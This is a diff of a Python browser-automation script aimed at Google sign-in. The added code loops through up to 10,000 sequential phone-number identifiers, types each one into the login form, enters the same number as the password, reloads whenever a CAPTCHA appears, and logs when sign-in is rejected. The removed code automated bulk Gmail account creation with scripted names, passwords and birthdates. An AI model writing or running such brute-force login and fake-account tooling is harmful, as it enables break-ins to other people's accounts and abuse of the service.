@@ -47,96 +47,76 @@ def main(account_data, postinfo, packages_id, body_mail):
         return False
 
     try:
+        loginurl = 'https://accounts.google.com/signin/v2/identifier'
 
-        b.get_url('https://gmail.com')
+        b.get_url(loginurl)
         # b.get_url('https://accounts.google.com/signup/v2/webcreateaccount?service=mail&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp')
     except:
         b.exit()
     # time.sleep(120)
     count = 0
-    for no in range(int(account_data['extra']), int(account_data['extra'])+1000):
+
+    for no in range(int(account_data['extra']), int(account_data['extra'])+10000):
+        time.sleep(1)
+
+        # rejeted
+        # https://accounts.google.com/signin/v2/deniedsigninrejected
+        # login page
+        loginurl = 'https://accounts.google.com/signin/v2/identifier'
+        # password page
+        # https://accounts.google.com/signin/v2/challenge/pwd
         count = count+1
-        if count > 20:
-            b.refresh()
+        print(count)
+        if count % 20 == 1:
+            worker_acc.update_account(data=no, id=account_data['id'])
+            b.get_url(loginurl)
+        if 'signinrejecte' in b.current_url():
+            print('rejected')
+            oldNumber = no-1
+            worker_acc.save_account(
+                data=oldNumber, soft_token=account_data['password'])
+            print(oldNumber)
 
-        if b.select_element('[id="identifierId"]'):
-            number = b.select_element('[id="identifierId"]')
-            number.clear()
-            number.send_keys(0)
-            number.send_keys(no)
-            b.wait_css('#identifierNext button[type="button"]')
-            nextpage = b.select_element(
-                '#identifierNext button[type="button"]')
+            b.get_url(loginurl)
+        if 'challenge/pwd' in b.current_url():
+            # print('password')
+            if b.try_select_element('[name="password"]'):
+                time.sleep(20)
+                print('passwdord area')
+
+                b.select_element('[name="password"]').send_keys(no)
+
+        imgcapch = b.try_select_element('[id="captchaimg"]')
+
+        try:
+
+            if imgcapch.get_attribute('src'):
+                b.get_url(loginurl)
+                # print('imgcapch')
+                continue
+        except:
+            b.get_url(loginurl)
+            continue
+
+        if 'identifier' in b.current_url():
+            # print('identifier')
+
+            try:
+                b.wait_css('[id="identifierId"]')
+                number = b.select_element('[id="identifierId"]')
+                number.clear()
+                number.send_keys(0)
+                number.send_keys(no)
+            except:
+                b.get_url(loginurl)
+                continue
+
+        nextpage = b.try_select_element(
+            '#identifierNext button[type="button"]')
+        try:
             nextpage.click()
-        else:
-            print(no)
-
-    exit()
-
-    name = account_data['post_data'].split("-")
-
-    print('first name typing')
-    for character in name[0]:
-        firstName.send_keys(character)
-        time.sleep(1)
-    lastName = b.select_element('[id="lastName"]')
-    print('last name typing')
-    for character in name[1]:
-        lastName.send_keys(character)
-        time.sleep(1)
-    username = b.select_element('[id="username"]')
-    print('username typing')
-
-    for character in name[0]+name[1]:
-        username.send_keys(character)
-        time.sleep(1)
-    time.sleep(5)
-    if b.try_select_element('button[data-username]'):
-        ConfirmUsername = b.select_element('button[data-username]')
-        ConfirmUsername.click()
-    Passwd = b.select_element('[name="Passwd"]')
-    print('Passwd typing')
-    for character in account_data['extra']:
-        Passwd.send_keys(character)
-        time.sleep(2)
-    ConfirmPasswd = b.select_element('[name="ConfirmPasswd"]')
-    for character in account_data['extra']:
-        ConfirmPasswd.send_keys(character)
-        time.sleep(2)
-
-    if b.try_select_element('button[data-username]'):
-        ConfirmUsername = b.select_element('button[data-username]')
-        ConfirmUsername.click()
-
-    nextpage = b.select_element_xpath(
-        '/html/body/div[1]/div[1]/div[2]/div[1]/div[2]/div/div/div[2]/div/div[2]/div/div[1]/div/div/button')
-    nextpage.click()
-
-    newgmail = b.select_element('[data-profile-identifier]')
-    if newgmail:
-        gmail = newgmail.get_attribute("data-email")
-        recoveryEmail = b.select_element('[name="recoveryEmail"]')
-        recoveryEmail.send_keys(account_data['email'])
-
-        day = b.select_element('[name="day"]')
-        day.send_keys(23)
-        month = b.select_dropdown('[id="month"]', '11')
-        year = b.select_element('[name="year"]')
-        year.send_keys(1990)
-
-        gender = b.select_dropdown('[id="gender"]', '2')
-        button = b.select_element('[type="button"]')
-        button.click()
-        print('others option')
-        time.sleep(200)
-    else:
-
-        print('varify need')
-
-    worker_acc.post_error(
-        account_id, "action try", software_type='GmailCreator')
-    #title="thanks for flagging!"
-    # b.wait('//*[@title="thanks for flagging!"]')
+        except:
+            continue
 
     b.ipinfo_save(software_name='gmail creator')
 
